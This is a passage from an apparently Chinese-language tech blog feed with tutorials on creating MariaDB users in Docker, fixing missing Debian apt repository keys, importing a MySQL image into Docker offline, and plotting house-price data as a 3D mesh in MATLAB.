<figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">-- 格式</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'username'</span>@<span class="string">'ip_address'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'password'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 示例</span></span><br><span class="line"><span class="comment">-- 创建一个用于本地访问的用户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'test_user'</span>@<span class="string">'localhost'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'test_user'</span>;</span><br><span class="line"><span class="comment">-- 创建一个内网IP 10.10.10.200 可访问的用户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'test_user'</span>@<span class="string">'10.10.10.200'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'test_user'</span>;</span><br><span class="line"><span class="comment">-- 创建一个所有网络均可访问的用户</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">'test_user'</span>@<span class="string">'%'</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">'test_user'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 对test_user用户授予testDB内所有表的所有权限</span></span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">all</span> PRIVILEGES <span class="keyword">ON</span> testDB.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">'test_user'</span>@<span class="string">'localhost'</span>;</span><br><span class="line"><span class="keyword">GRANT</span> <span class="keyword">all</span> PRIVILEGES <span class="keyword">ON</span> testDB.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">'test_user'</span>@<span class="string">'%'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 刷新权限缓存</span></span><br><span class="line">FLUSH PRIVILEGES;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 查看当前所有用户信息</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> mysql.`<span class="keyword">user</span>`;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<h2 id="新用户登录数据库">4.3. 新用户登录数据库</h2>
<ol type="1">
<li><p>执行 <code>docker exec -it '容器iD'  bash</code> 命令，进入容器命令行模式（容器 ID 根据 <code>docker ps</code> 命令查看）。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">boyce@raspberry:~$ docker <span class="built_in">exec</span> -it 605366afff5f  bash</span><br><span class="line">root@605366afff5f:/# </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>执行 <code>mysql -u test_user -p</code> 命令，再输入用户密码，查看是否正常登录。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">root@605366afff5f:/# mysql -u test_user -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MariaDB connection <span class="built_in">id</span> is 9</span><br><span class="line">Server version: 10.5.9-MariaDB-1:10.5.9+maria~focal mariadb.org binary distribution</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type <span class="string">'help;'</span> or <span class="string">'\h'</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">'\c'</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>通过如下命令，可知：test_user 用户只能访问已被授权的 testDB 数据库，mysql 数据库访问则被拒绝。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">MariaDB [(none)]&gt; use testDB;</span><br><span class="line">Database changed</span><br><span class="line">MariaDB [testDB]&gt; use mysql;</span><br><span class="line">ERROR 1044 (42000): Access denied <span class="keyword">for</span> user <span class="string">'test_user'</span>@<span class="string">'localhost'</span> to database <span class="string">'mysql'</span></span><br><span class="line">MariaDB [testDB]&gt; </span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>通过如下 SQL 语句，查看是否可正常新建表。 </p><figure class="highlight sql"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> IF <span class="keyword">NOT</span> <span class="keyword">EXISTS</span> `db_student_info`(</span><br><span class="line">   `student_id` <span class="type">INT</span> UNSIGNED AUTO_INCREMENT,</span><br><span class="line">   `student_name` <span class="type">VARCHAR</span>(<span class="number">100</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">   `sex` <span class="type">VARCHAR</span>(<span class="number">40</span>) <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">   `create_date` <span class="type">DATE</span>,</span><br><span class="line">   `class_id` <span class="type">INT</span> UNSIGNED <span class="keyword">NOT</span> <span class="keyword">NULL</span>,</span><br><span class="line">   <span class="keyword">PRIMARY</span> KEY ( `student_id` )</span><br><span class="line">)ENGINE<span class="operator">=</span>InnoDB <span class="keyword">DEFAULT</span> CHARSET<span class="operator">=</span>utf8;</span><br></pre></td></tr></tbody></table></figure><p></p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
        <tag>MariaDB</tag>
        <tag>arm64位系统</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】树莓派安装 Debian 系统，配置软件仓库出现公钥缺失问题的解决办法</title>
    <url>/p/26c94821.html</url>
    <content><![CDATA[<h1 id="错误场景">1. 错误场景</h1>
<p>在刷入树莓派的官方 Debian 系统，开机进入界面，将软件源替换成国内后，执行更新命令，发现报了如下所示的错误，提示公钥缺失，导致无法访问软件源。</p>
<span id="more"></span>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ <span class="built_in">sudo</span> apt update</span><br><span class="line">命中:1 http://mirrors.tuna.tsinghua.edu.cn/raspberrypi buster InRelease</span><br><span class="line">获取:2 https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease [122 kB]</span><br><span class="line">获取:3 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease [51.9 kB]</span><br><span class="line">获取:4 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports InRelease [46.7 kB]</span><br><span class="line">获取:5 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates InRelease [65.4 kB]</span><br><span class="line">错误:2 https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease</span><br><span class="line">  由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138 NO_PUBKEY DCC9EFBF77E11517</span><br><span class="line">错误:3 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease</span><br><span class="line">  由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138</span><br><span class="line">错误:4 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports InRelease</span><br><span class="line">  由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138</span><br><span class="line">错误:5 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates InRelease</span><br><span class="line">  由于没有公钥，无法验证下列签名： NO_PUBKEY AA8E81B4331F7F50 NO_PUBKEY 112695A0E562B32A</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138 NO_PUBKEY DCC9EFBF77E11517</span><br><span class="line">E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease” 没有数字签名。</span><br><span class="line">N: 无法安全地用该源进行更新，所以默认禁用该源。</span><br><span class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br><span class="line">W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138</span><br><span class="line">E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease” 没有数字签名。</span><br><span class="line">N: 无法安全地用该源进行更新，所以默认禁用该源。</span><br><span class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br><span class="line">W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY 04EE7237B7D453EC NO_PUBKEY 648ACFD622F3D138</span><br><span class="line">E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports InRelease” 没有数字签名。</span><br><span class="line">N: 无法安全地用该源进行更新，所以默认禁用该源。</span><br><span class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br><span class="line">W: GPG 错误：https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates InRelease: 由于没有公钥，无法验证下列签名： NO_PUBKEY AA8E81B4331F7F50 NO_PUBKEY 112695A0E562B32A</span><br><span class="line">E: 仓库 “https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates InRelease” 没有数字签名。</span><br><span class="line">N: 无法安全地用该源进行更新，所以默认禁用该源。</span><br><span class="line">N: 参见 apt-secure(8) 手册以了解仓库创建和用户配置方面的细节。</span><br></pre></td></tr></tbody></table></figure>
<h1 id="解决方法">2. 解决方法</h1>
<p>执行如下命令，安装公钥信息。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment"># DCC9EFBF77E11517这一串，替换成自己的，在上述日志中可找到，如有多个，则执行多次</span></span><br><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv DCC9EFBF77E11517</span><br><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv 648ACFD622F3D138</span><br><span class="line"><span class="built_in">sudo</span> apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv AA8E81B4331F7F50</span><br></pre></td></tr></tbody></table></figure><p></p>
<h1 id="结果验证">3. 结果验证</h1>
<p>通过更新，可看到已正常访问软件源，并更新。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt update</span><br><span class="line"><span class="built_in">sudo</span> apt upgrade</span><br></pre></td></tr></tbody></table></figure><p></p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ <span class="built_in">sudo</span> apt update</span><br><span class="line">命中:1 http://mirrors.tuna.tsinghua.edu.cn/raspberrypi buster InRelease</span><br><span class="line">命中:2 https://mirrors.tuna.tsinghua.edu.cn/debian buster InRelease</span><br><span class="line">获取:3 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates InRelease [51.9 kB]</span><br><span class="line">获取:4 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports InRelease [46.7 kB]</span><br><span class="line">获取:5 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates InRelease [65.4 kB]</span><br><span class="line">获取:6 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/main armhf Packages [9,488 B]</span><br><span class="line">获取:7 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/main Translation-en [6,834 B]</span><br><span class="line">获取:8 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/non-free armhf Packages [604 B]</span><br><span class="line">获取:9 https://mirrors.tuna.tsinghua.edu.cn/debian buster-updates/non-free Translation-en [673 B]</span><br><span class="line">获取:10 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/main armhf Packages [440 kB]</span><br><span class="line">获取:11 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/main Translation-en [381 kB]</span><br><span class="line">获取:12 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/contrib armhf Packages [8,320 B]</span><br><span class="line">获取:13 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/contrib Translation-en [8,132 B]</span><br><span class="line">获取:14 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/non-free armhf Packages [13.0 kB]</span><br><span class="line">获取:15 https://mirrors.tuna.tsinghua.edu.cn/debian buster-backports/non-free Translation-en [36.4 kB]</span><br><span class="line">获取:16 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates/main armhf Packages [262 kB]</span><br><span class="line">获取:17 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates/main Translation-en [142 kB]</span><br><span class="line">获取:18 https://mirrors.tuna.tsinghua.edu.cn/debian-security buster/updates/non-free Translation-en [344 B]</span><br><span class="line">已下载 1,308 kB，耗时 9秒 (150 kB/s)</span><br><span class="line">正在读取软件包列表... 完成</span><br><span class="line">正在分析软件包的依赖关系树</span><br><span class="line">正在读取状态信息... 完成</span><br><span class="line">有 853 个软件包可以升级。请执行 ‘apt list --upgradable’ 来查看它们。</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
        <tag>Debian</tag>
        <tag>软件源</tag>
      </tags>
  </entry>
  <entry>
    <title>【Linux】离线环境 docker 导入 MySQL 镜像并初始化容器</title>
    <url>/p/44c560ae.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>  在上一篇<a href="/p/28064c7.html" target="_blank">《【Linux】基于
CentOS 7 系统离线安装 docker
并更新至最新版》</a>博客中，介绍了如何在内网离线环境安装 docker 服务，接下来，将以 MySQL 数据库为例，继续介绍如何在内网离线环境中导入 MySQL 镜像包，并启动 MySQL 容器。</p>
<hr>
<h1 id="操作步骤">2. 操作步骤</h1>
<ol type="1">
<li><p>话不多说，直接开始，在可联网的相同 Linux 环境中，拉取需要的版本镜像至本地。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker pull mysql:5.7</span><br></pre></td></tr></tbody></table></figure> <img src="/p/44c560ae/拉取MySQL镜像包.webp" alt="拉取MySQL镜像包"><p></p></li>
<li><p>查看下载好的 MySQL 镜像 ID。 </p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></tbody></table></figure> <img src="/p/44c560ae/查看MySQL镜像ID.webp" alt="查看MySQL镜像ID"><p></p></li>
<li><p>按照如下命令，修改对应的镜像 ID，将镜像包打包成 tar 格式，便于传输和备份。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker save -o mysql57.tar 09361feeb475</span><br></pre></td></tr></tbody></table></figure> <img src="/p/44c560ae/打包MySQL镜像.webp" alt="打包MySQL镜像"><p></p></li>
<li><p>将打包好的 tar 包上传至内网的 Linux 服务器中，并进入对应目录，执行如下命令，加载镜像包。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line">docker load --input mysql57.tar</span><br></pre></td></tr></tbody></table></figure> <img src="/p/44c560ae/加载MySQL镜像包.webp" alt="加载MySQL镜像包"><p></p></li>
<li><p>按照如下命令格式，修改 root 用户密码和镜像 ID，启动 MySQL 容器并初始化 root 用户。
</p><figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p <span class="variable">$HOME</span>/mysql/data       <span class="comment"># 创建数据库文件存储路径</span></span><br><span class="line">docker run -d --name mysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=123456 -v <span class="variable">$HOME</span>/mysql/data:/var/lib/mysql 09361feeb475</span><br></pre></td></tr></tbody></table></figure><p></p></li>
<li><p>至此，内网环离线安装 MySQL 容器就完成了。后续的创建数据库、用户以及 Navicat 连接使用，可参考博客<a href="/p/91c89f1d.html#4-数据库配置" target="_blank">《【Linux】树莓派
arm64 位 Ubuntu 系统基于 docker 安装 MariaDB
数据库》第四章节</a>。</p></li>
</ol>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Docker</tag>
        <tag>离线安装</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>【MATLAB】自学记录之基于某楼栋房价数据绘制三维网格图</title>
    <url>/p/7c8c9cc0.html</url>
    <content><![CDATA[<h1 id="前言">1. 前言</h1>
<p>基于某小区某一楼栋各个户型及楼层之间对应的出售价格表，通过 MATLAB 脚本进行读取解析，并绘制成三维网格图，从而能够直观地以可视化的角度观察户型位置（东边户、西边户、中间连廊户）、楼层位置（高中低楼层）等因素是否与出售价格存在一定的影响关系。</p>
<hr>
<h1 id="预置条件">2. 预置条件</h1>
<table>
<colgroup>
<col style="width: 5%">
<col style="width: 19%">
<col style="width: 75%">
</colgroup>
<thead>
<tr class="header">
<th style="text-align: center;">序号</th>
<th style="text-align: center;">配置项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;"> 1</td>
<td style="text-align: center;"> 某楼栋出售价格表</td>
<td>存储了各楼层及各户型对应的房价数据文件，以 xlsx 或 txt 格式进行存储</td>
</tr>
<tr class="even">
<td style="text-align: center;"> 2</td>
<td style="text-align: center;">MATLAB</td>
<td>2023b</td>
</tr>
</tbody>
</table>
<hr>
<h1 id="步骤记录">3. 步骤记录</h1>
<ol type="1">
<li><p>将文件放置在当前文件夹下，与 MATLAB 代码文件保持同一层级，文件内容示例如下。</p>
<p><img src="/p/7c8c9cc0/某楼栋房价示例数据文件.jpg"></p></li>
<li><p>使用 <code>readtable</code> 函数读取 xlsx 文件，或用 <code>load</code> 命令直接加载 txt 文件。此时 priceData 变量的数据类型是 30*4 的 <code>double</code> 类型的二维矩阵。</p>
<blockquote>
<p>设定该楼栋为 4 户型 30 层。</p>
</blockquote>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">% 读取xlsx文件，并转换成double类型的二维矩阵</span></span><br><span class="line">priceData = table2array(<span class="built_in">readtable</span>(<span class="string">'priceData.xlsx'</span>));</span><br><span class="line"><span class="comment">% 读取txt文件，MATLAB将自动以文件名作为变量名称，存储文件中的数据</span></span><br><span class="line">load priceData.txt;</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>根据 priceData 矩阵的维度，分别生成户型行向量和楼层行向量。</p>
<blockquote>
<p>priceData 矩阵存储的数据中，行数为楼层，列数为户型。</p>
</blockquote>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">rooms = <span class="number">1</span>:<span class="built_in">size</span>(priceData, <span class="number">2</span>);</span><br><span class="line">floors = <span class="number">1</span>:<span class="built_in">size</span>(priceData, <span class="number">1</span>);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>对户型和楼层生成二维网格矩阵，此时 rooms 和 floors 矩阵的维度均变成了 30*4，且与 priceData 矩阵保持一致。</p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line">[room_1, floor_1] = <span class="built_in">meshgrid</span>(rooms, floors);</span><br></pre></td></tr></tbody></table></figure></li>
<li><p>通过 <code>mesh</code> 函数绘制并渲染三维网格图，效果如下。 <img src="/p/7c8c9cc0/三维网格图.jpg"></p>
<figure class="highlight matlab"><table><tbody><tr><td class="code"><pre><span class="line"><span class="built_in">figure</span>;</span><br><span class="line">mesh(room_1, floor_1, priceData);</span><br><span class="line">xlabel(<span class="string">"户型"</span>);</span><br><span class="line">ylabel(<span class="string">"楼层"</span>);</span><br><span class="line">zlabel(<span class="string">"单价"</span>);</span><br><span class="line">grid on;</span><br></pre></td></tr></tbody></table></figure></li>
</ol>
<hr>
<h1 id="数据插值优化">4. 数据插值优化</h1>
<p>通过观察以上生成的三维网格图，可基本看出楼层、户型与价格的影响关系。如：底顶楼层的价格相对较低；其他楼层中，每隔几层楼就出现一次价格较低的楼层；同一楼层中不同户型位置价格变化不大，整体上西边户（01 户）的出售价格相较于其他户型来说是偏低的。
但是，由于楼层仅有 30 层，相邻楼层之间的连线较为生硬，希望通过平滑曲线来展示同一户型不同楼层的价格影响趋势，这就需要将楼层以及出售价格等数据进行精细化处理，处理步骤如下。</p>
<ol type="1">
<li><p>分别对户型行向量和楼层行向量进行精细化处理，此时户型和楼层行向量的长度可通过如下公式计算。
<svg xmlns="http://www.w3.org/2000/svg" width="31.964ex" height="7.274ex" viewbox="0 -1857.7 14128.2 3215.3" xmlns:xlink="http://www.w3.org/1999/xlink" aria-hidden="true" style=""><defs><path id="MJX-5-TEX-S4-7B" d="M661 -1243L655 -1249H622L604 -1240Q503 -1190 434 -1107T348 -909Q346 -897 346 -499L345 -98L343 -82Q335 3 287 87T157 223Q146 232 145 236Q144 240 144 250Q144 265 145 268T157 278Q242 333 288 417T343 583L345 600L346 1001Q346 1398 348 1410Q379 1622 600 1739L622 1750H655L661 1744V1727V1721Q661 1712 661 1710T657 1705T648 1700T630 1690T602 1668Q589 1659 574 1643T531 1593T484 1508T459 1398Q458 1389 458 1001Q458 614 457 605Q441 435 301 316Q254 277 202 251L250 222Q260 216 301 185Q443 66 457 -104Q458 -113 458 -501Q458 -888 459 -897Q463 -944 478 -988T509 -1060T548 -1114T580 -1149T602 -1167Q620 -1183 634 -1192T653 -1202T659 -1207T661 -1220V-1226V-1243Z"/><path id="MJX-5-TEX-I-1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z"/><path id="MJX-5-TEX-I-1D452" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"/><path id="MJX-5-TEX-I-1D45B" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/><path id="MJX-5-TEX-I-1D45F" d="M21 287Q22 290 23 295T28 317T38 348T53 381T73 411T99 433T132 442Q161 442 183 430T214 408T225 388Q227 382 228 382T236 389Q284 441 347 441H350Q398 441 422 400Q430 381 430 363Q430 333 417 315T391 292T366 288Q346 288 334 299T322 328Q322 376 378 392Q356 405 342 405Q286 405 239 331Q229 315 224 298T190 165Q156 25 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 114 189T154 366Q154 405 128 405Q107 405 92 377T68 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-5-TEX-I-1D45C" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"/><path id="MJX-5-TEX-I-1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"/><path id="MJX-5-TEX-N-5F" d="M0 -62V-25H499V-62H0Z"/><path id="MJX-5-TEX-I-1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"/><path id="MJX-5-TEX-I-1D461" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"/><path id="MJX-5-TEX-I-1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"/><path id="MJX-5-TEX-N-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"/><path id="MJX-5-TEX-I-1D460" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"/><path id="MJX-5-TEX-I-1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"/><path id="MJX-5-TEX-N-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/><path id="MJX-5-TEX-N-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 